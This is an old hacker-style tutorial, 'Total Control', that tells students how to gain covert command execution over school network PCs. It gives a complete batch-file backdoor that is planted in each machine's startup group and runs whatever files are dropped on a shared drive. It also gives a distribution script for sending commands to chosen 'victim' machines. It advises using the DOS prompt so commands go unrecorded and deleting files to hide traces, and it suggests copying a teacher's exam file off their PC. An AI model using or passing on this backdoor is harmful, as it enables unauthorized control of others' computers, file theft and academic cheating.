<*> Total Control - A Project For Your School Network

Here I'll tell ya how to get what looks like total control over PCs on
a Windows LAN with low security. It can be pretty funny, and can really
freak out your friends and stuff! Things you need are: write access to
a network drive, and physical access to the target computers.

So here's what you do:

When you are going in to typing class or whatever, start up notepad,
and type in this:

   @echo off
   echo Logging in to network drive .....
   :start
   if exist h:\mydir\1.bat goto run
   goto start
   :run
   call h:\mydir\1.bat
   del h:\mydir\1.bat
   goto start

Instead of "h:\mydir", change it to a server directory that you have
write access to.

Save the file as c:\target.bat

Then add a shortcut in the startup group that runs the command
"Start /m c:\target.bat".

Then the next day, sit at a different computer, and type the same thing
except typing in "2.bat" instead of "1.bat" You can continue on this
process until you have all your targets set up. This way, you get
individual control over each of the victim machines.

Now you have to write the controlling file. It's fairly long so I have
typed it out in full here for you. It is only a rough draft so mess
about with it as much as you like.

<*>--------------------------< Distrib.bat >------------------------<*>

@echo off
if a%1==a goto noparam
if a%2==a goto noparam
if %1==/? goto noparam
if not exist %1 goto nofile
if not exist %2\nul goto nodir

set srcfile=%1
set distdir=%2
shift
shift

:dodist
copy %srcfile% %distdir%\%1.bat
if a%2==a goto quit
shift
goto dodist

:noparam
echo                         -----====[ Total Control ]====-----
echo                                      By  GPF#2
echo.
echo USAGE:
echo     distrib file directory number number number ....
echo.
echo EXAMPLE:
echo Distribute cntrl.txt to computers 2, 6, 4, 9, 11, 41, and 21
echo Using n:\log as the directory to write to:
echo     distrib cntrl.txt n:\log 2 6 4 9 11 40 21
goto quit

:nofile
echo Error - Input file unfound.  Type distrib /? for usage
goto quit

:nodir
echo Error - Distribution directory does not exist.
echo Type distrib /? for usage
goto quit

:quit

<*>--------------------------< Distrib.bat >------------------------<*>

So select all of the text between the markers, and copy it to the your
clipboard. Then paste it in to notepad, and save it on to a disk as
Distrib.bat . This batch file is the one you will need to run every
time you want to control a PC, so take care of it! It gives you some
info on how to use it if you type distrib /? . If you have followed all
the steps in this file, you are nearly finished. What is left now, is
to decide what you actually want the other PCs to do, and how to do it.

A really simple one is this -

1. Startup Notepad
2. Type in this:

       echo I CAN SEE YOU>c:\temporary.txt
       notepad c:\temporary.txt

3. Save the file as c:\IcanCU.txt
4. At the MSDOS prompt type: 

"a:\distrib.bat c:\IcanCU.txt h:\mydir 1 3 4 5 7"

5. Sit back, and watch the message "I CAN SEE YOU" displayed on target
   number 1, number 3, 4, 5, and number 7.
6. Don't burst your hole laughing, because they'll know it was you, and
   you'll be busted!

So step 2 is the main work done by your program. This can obviously be
customised to do a lot more than just display something in Notepad.
Step 4 uses Distrib.bat to send the messages to the server. So instead
of "h:\mydir", type the directory that the victims are set to use.
Also in step 4, try to use the MSDOS prompt. This will work from the
"Run" box on the start menu, but in MSDOS prompt, each command is not
recorded.

When the messages start appearing onscreen, there will be plenty of
distractions for you to smuggle your floppy out of it's drive. Delete
the file c:\IcanCU.txt while you are at the DOS prompt also. That's the
command "del c:\IcanCU.txt" for all you Win'95 people. Actually, I just
thought of something you could do for Step 2:

Suppose a teacher was writing your summer test, and was saving it as
c:\windows\test.doc in MS Word. You could send their machine the
command:

   copy c:\windows\test.doc h:\mydir

This would copy the file to the server, ready for your retrieval!
Good luck, and have fun. I did ;-)
